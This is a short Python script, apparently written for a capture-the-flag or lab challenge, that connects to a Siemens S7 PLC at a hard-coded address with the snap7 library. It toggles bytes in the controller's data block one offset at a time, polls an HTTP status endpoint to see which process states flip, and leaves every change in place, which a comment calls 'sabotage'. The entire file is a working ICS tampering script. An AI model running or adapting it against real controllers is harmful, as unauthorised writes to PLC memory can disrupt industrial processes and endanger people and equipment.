import snap7
import urllib.request
import json
import time

IP = "154.57.164.80"
PORT_S7 = 30297
SKIP = set(range(32, 34)) | set(range(38, 40)) | set(range(48, 50))  # known INT/REAL fields

def get_status():
    resp = urllib.request.urlopen("http://154.57.164.80:32119/status")
    return json.loads(resp.read())

client = snap7.client.Client()
client.connect(IP, 0, 1, tcp_port=PORT_S7)

data = bytearray(client.db_read(1, 0, 512))

baseline = get_status()
print("BASELINE:", {k: v for k, v in baseline.items() if isinstance(v, bool)})

for offset in range(0, 100):
    if offset in SKIP:
        continue
    orig = data[offset]
    newval = 0 if orig == 1 else 1
    try:
        client.db_write(1, offset, bytes([newval]))
    except Exception as e:
        print(f"offset {offset}: write failed: {e}")
        continue
    time.sleep(0.3)
    new_status = get_status()
    diffs = {k: (baseline.get(k), v) for k, v in new_status.items()
             if isinstance(v, bool) and baseline.get(k) != v}
    if diffs:
        print(f"offset {offset}: orig={orig} -> {newval} caused diffs: {diffs}")
    # leave the toggle in place (sabotage), update baseline for next comparison
    baseline = new_status

client.disconnect()
print("\nFINAL STATUS:")
print(json.dumps(get_status(), indent=2))
